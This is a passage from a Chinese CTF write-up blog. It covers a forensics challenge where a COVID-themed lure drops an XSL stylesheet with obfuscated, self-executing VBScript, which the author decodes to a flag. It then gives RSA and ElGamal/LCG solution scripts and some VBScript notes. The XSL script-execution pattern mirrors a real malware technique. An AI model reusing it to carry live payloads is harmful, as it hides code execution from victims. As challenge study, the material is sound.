id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h5><p>执行命令后，产生了9sOXN6Ltf0afe7.js；20200308-sitrep-48-covid-19.pdf；cSi1r0uywDNvDu.tmp</p><p>将生成的cSi1r0uywDNvDu.tmp的内容base64后Winrar解压开来，得到：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stylesheet</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:ms</span>=<span class="string">&quot;urn:schemas-microsoft-com:xslt&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">&quot;placeholder&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">&quot;user&quot;</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span></span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> rBOH7OLTCVxzkH = HrtvBsRh3gNUbe(&quot;676d60667a64333665326564333665326564333665326536653265643336656564333665327c&quot;):</span><br><span class="line"> execute(rBOH7OLTCVxzkH):</span><br><span class="line">                       function HrtvBsRh3gNUbe(bhhz6HalbOkrki):</span><br><span class="line">                                              for rBOH7OLTCVxzkH= 1 to len(bhhz6HalbOkrki) step 2:</span><br><span class="line">                                                                     HrtvBsRh3gNUbe = HrtvBsRh3gNUbe &amp; chr(asc(chr(&quot;&amp;h&quot; &amp; mid(bhhz6HalbOkrki,rBOH7OLTCVxzkH,2)))xor 1):</span><br><span class="line">                                                                     next:</span><br><span class="line">                       end function:</span><br><span class="line"> ]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h5><p>对其中VBScript语言学习后，意识到只是异或即可解开，编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;676d60667a64333665326564333665326564333665326536653265643336656564333665327c&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="built_in">str</span>(a2b_hex(c))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">1</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># flag&#123;e27d3de27d3de27d3d7d3de27dde27d3&#125;</span></span><br></pre></td></tr></table></figure><p>昨天半夜，无意间点开blog的about，发现是<strong>学长</strong>！</p><p>NEFU，YYDS！</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h3><h4 id="题目一名称：babyrsa"><a href="#题目一名称：babyrsa" class="headerlink" title="题目一名称：babyrsa"></a>题目一名称：babyrsa</h4><h5 id="步骤一-1"><a href="#步骤一-1" class="headerlink" title="步骤一"></a>步骤一</h5><p>将enc文件加上后缀txt，看到chall中所打印的数据，得到N,e,c</p><h5 id="步骤二-1"><a href="#步骤二-1" class="headerlink" title="步骤二"></a>步骤二</h5><p><strong>网页在线分解大素数N，获得p、q,计算欧拉函数（p-1）*（q-1），求逆元d，得解</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> gmpy2</span><br><span class="line">from Crypto.Util.number <span class="built_in">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="attr">p</span> = <span class="number">98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033</span></span><br><span class="line"></span><br><span class="line"><span class="attr">q</span> = <span class="number">133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = p*q</span><br><span class="line"></span><br><span class="line"><span class="attr">e</span> = <span class="number">2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877</span></span><br><span class="line"></span><br><span class="line"><span class="attr">c</span> = <span class="number">1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524</span></span><br><span class="line"></span><br><span class="line"><span class="attr">phi</span> = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="attr">d</span> = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="attr">m</span> = gmpy2.powmod(c, d, n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment"># hwctf&#123;01d_Curs3_c4Me_Again&#125;</span></span><br></pre></td></tr></table></figure><h4 id="题目二名称：crypto-Elgamal"><a href="#题目二名称：crypto-Elgamal" class="headerlink" title="题目二名称：crypto_Elgamal"></a>题目二名称：crypto_Elgamal</h4><h5 id="步骤一-2"><a href="#步骤一-2" class="headerlink" title="步骤一"></a>步骤一</h5><p>典型的Elgamal算法，要求出A、B、q</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">s0</span> = <span class="number">543263588863771657634119</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">s1</span> = <span class="number">628899245716105951093835</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">s2</span> = <span class="number">78708024695487418261582</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">s3</span> = <span class="number">598971435111109998816796</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">s4</span> = <span class="number">789474285039501272453373</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">assert ( A * <span class="built_in">s0</span> + <span class="keyword">B </span>) % q == <span class="built_in">s1</span></span><br><span class="line"></span><br><span class="line">assert ( A * <span class="built_in">s1</span> + <span class="keyword">B </span>) % q == <span class="built_in">s2</span></span><br><span class="line"></span><br><span class="line">assert ( A * <span class="built_in">s2</span> + <span class="keyword">B </span>) % q == <span class="built_in">s3</span></span><br><span class="line"></span><br><span class="line">assert ( A * <span class="built_in">s3</span> + <span class="keyword">B </span>) % q == <span class="built_in">s4</span></span><br></pre></td></tr></table></figure><p>用模运算有关知识尝试了一个上午，不会了，解不开。</p><p><strong>伟大的lines指引我说</strong>：<a href="https://blog.csdn.net/superprintf/article/details/108964563">“线性同余”</a></p><p>我悟。</p><p><img src="https://img-blog.csdnimg.cn/20201008161432154.png#pic_center" alt="线性同余方程"></p><table><thead><tr><th>目的</th><th>公式</th></tr></thead><tbody><tr><td>1.Xn+1反推出Xn</td><td>Xn=(a-1 (Xn+1 - b))%m</td></tr><tr><td>2.求a</td><td>a=((Xn+2-Xn+1)(Xn+1-Xn)-1)%m</td></tr><tr><td>3.求b</td><td>b=(Xn+1 - aXn)%m</td></tr><tr><td>4.求m</td><td>tn=Xn+1-Xn，m=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</td></tr></tbody></table><p><strong>对应关系：</strong></p><p>a -&gt; A</p><p>b -&gt; B</p><p>m -&gt; q    </p><p>t -&gt; s<br>根据性质，先求出q，后用q求出A、B;</p><p>为了方便取值，我用n=2来进行运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s0 = <span class="number">543263588863771657634119</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="number">628899245716105951093835</span></span><br><span class="line"></span><br><span class="line">s2 = <span class="number">78708024695487418261582</span></span><br><span class="line"></span><br><span class="line">s3 = <span class="number">598971435111109998816796</span></span><br><span class="line"></span><br><span class="line">s4 = <span class="number">789474285039501272453373</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">LCG算法，求q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn=Xn+1-Xn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn+1 = Xn+2 - Xn+1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t2+1 = X2+2 - X2+1</span></span><br><span class="line"></span><br><span class="line">tnjia1 = s4 - s3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn-1 = Xn - Xn-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t2-1 = X2 - X2-1</span></span><br><span class="line"></span><br><span class="line">tnjian1 = s2 - s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn = Xn+1 - Xn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t2 = X2+1 - X2</span></span><br><span class="line"></span><br><span class="line">tn = s3 - s2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn-2 = Xn-1 - Xn-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t0 = s1 - s0</span></span><br><span class="line"></span><br><span class="line">tnjina2 = s1 - s0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = gmpy2.gcd((tnjia1 * tnjian1 - tn * tn), (tn * tnjina2 - tnjian1 * tnjian1))  <span class="comment"># q = 791763770658839585424113</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">求A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = ((Xn+2-Xn+1)(Xn+1-Xn)-1)%m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A = ((s4-s3)* (s3-s2)-1  ) mod q</span></span><br><span class="line"></span><br><span class="line">inv = <span class="built_in">int</span>(gmpy2.invert(s3-s2, q))  <span class="comment"># 179550098159049266105992</span></span><br><span class="line"></span><br><span class="line">A = ((s4-s3)*inv) % q  <span class="comment"># 791763770658839585424113</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">求B</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = (Xn+1 - aXn)%m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># B = (s3 - A*s2)%q</span></span><br><span class="line"></span><br><span class="line">B = (s3 - A*s2) % q  <span class="comment"># 3035433788765894539799</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A=&quot;</span>, A)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B=&quot;</span>, B)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br></pre></td></tr></table></figure><h5 id="步骤二-2"><a href="#步骤二-2" class="headerlink" title="步骤二"></a>步骤二</h5><p>参数齐全后，根据CTFwiki上的同类型题的现成代码解不开（<strong>95%相似度</strong>）</p><p>在我犹豫与惆怅时</p><p><strong>伟大的lines指引我说</strong>：<a href="https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=mouse0333&logNo=221331160503">此处</a>(<strong>K-Pop forever!</strong></p><p>利用A、B、q与已有的成熟Elgamal解法(稍加修改)，解出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s0 = <span class="number">543263588863771657634119</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="number">628899245716105951093835</span></span><br><span class="line"></span><br><span class="line">s2 = <span class="number">78708024695487418261582</span></span><br><span class="line"></span><br><span class="line">s3 = <span class="number">598971435111109998816796</span></span><br><span class="line"></span><br><span class="line">s4 = <span class="number">789474285039501272453373</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">LCG算法，求q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn=Xn+1-Xn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn+1 = Xn+2 - Xn+1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t2+1 = X2+2 - X2+1</span></span><br><span class="line"></span><br><span class="line">tnjia1 = s4 - s3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn-1 = Xn - Xn-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t2-1 = X2 - X2-1</span></span><br><span class="line"></span><br><span class="line">tnjian1 = s2 - s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn = Xn+1 - Xn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t2 = X2+1 - X2</span></span><br><span class="line"></span><br><span class="line">tn = s3 - s2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tn-2 = Xn-1 - Xn-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t0 = s1 - s0</span></span><br><span class="line"></span><br><span class="line">tnjina2 = s1 - s0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = gmpy2.gcd((tnjia1 * tnjian1 - tn * tn), (tn * tnjina2 - tnjian1 * tnjian1))  <span class="comment"># q = 791763770658839585424113</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">求A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = ((Xn+2-Xn+1)(Xn+1-Xn)-1)%m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># A = ((s4-s3)* (s3-s2)-1  ) mod q</span></span><br><span class="line"></span><br><span class="line">inv = <span class="built_in">int</span>(gmpy2.invert(s3-s2, q))  <span class="comment"># 179550098159049266105992</span></span><br><span class="line"></span><br><span class="line">A = ((s4-s3)*inv) % q  <span class="comment"># 791763770658839585424113</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">求B</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = (Xn+1 - aXn)%m</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># B = (s3 - A*s2)%q</span></span><br><span class="line"></span><br><span class="line">B = (s3 - A*s2) % q  <span class="comment"># 3035433788765894539799</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g = <span class="number">27642593390439430783453736408814717946185190497201679721975757020767271070510268596627490205095779429964809833535285315202625851326460572368018875381603399143376574281200028337681552876140857556460885848491160812604549770668188783258592940823128376128198726254875984002214053523752696104568469730021811399216</span></span><br><span class="line"></span><br><span class="line">h = <span class="number">54585833166051670245656045196940486576634589000609010947618047461787934106392112227019662788387352615714332234871251868259282522817042504587428441746855906297390193418159792477477443129333707197013251839952389651332058368911829464978546505729530760951698134101053626585254469108630886768357270544236516534904</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">60724920570148295800083597588524297283595971970237964464679084640302395172192639331196385150232229004030419122038089044697951208850497923486467859070476427472465291810423905736825272208842988090394035980454248119048131354993356125895595138979611664707727518852984351599604226889848831071126576874892808080133</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">48616294792900599931167965577794374684760165574922600262773518630884983374432147726140430372696876107933565006549344582099592376234783044818320678499613925823621554608542446585829308488452057340023780821973913517239972817669309837103043456714481646128392677624092659929248296869048674230341175765084122344264</span></span><br><span class="line"></span><br><span class="line">c1_ = <span class="number">42875731538109170678735196002365281622531058597803022779529275736483962610547258618168523955709341579773947887175626960699426438456382655370090748369934296474999389316334717699127421889816721511602392591677377678759026657582648354688447456509292302633971842316239774410380221303269351351929586256938787054867</span></span><br><span class="line"></span><br><span class="line">c2_ = <span class="number">64829024929257668640929285124747107162970460545535885047576569803424908055130477684809317765011143527867645692710091307694839524199204611328374569742391489915929451079830143261799375621377093290249652912850024319433129432676683899459510155157108727860920017105870104383111111395351496171846620163716404148070</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># q is prime</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g ** q % p == 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_q = <span class="built_in">pow</span>(c2, q, p)</span><br><span class="line"></span><br><span class="line">m_A_1 = (<span class="built_in">pow</span>(c2, A, p) * gmpy2.invert(c2_, p) * <span class="built_in">pow</span>(h, B, p)) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_, i, j = gmpy2.gcdext(A-<span class="number">1</span>, q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">    tmp1 = <span class="built_in">pow</span>(m_A_1, i, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    tmp1 = gmpy2.invert(<span class="built_in">int</span>(<span class="built_in">pow</span>(m_A_1, -i, p)), p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> j &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">    tmp2 = <span class="built_in">pow</span>(m_q, j, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    tmp2 = gmpy2.invert(<span class="built_in">int</span>(<span class="built_in">pow</span>(m_q, -j, p)), p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = (tmp1 * tmp2) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))  <span class="comment"># b&#x27;flag&#123;19e9f185e6a680324cedd6e6d9382743&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="VBscript"><a href="#VBscript" class="headerlink" title="VBscript"></a>VBscript</h1><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><ul><li>for  i=X  to Y</li><li>Next</li><li>step</li></ul><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcXCNhkStuXmscCRo35.VoLdSv0btFWxReHt0XKpRleCuWo1zgvMFSMuqZfMVIrndkL2vFpVS6hS2BXq4Lu0T460!/b&bo=KgU2BAAAAAADNw8!&rf=viewer_4" alt="img"></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li>赋值 定义了 函数返回值</li></ul><p><img 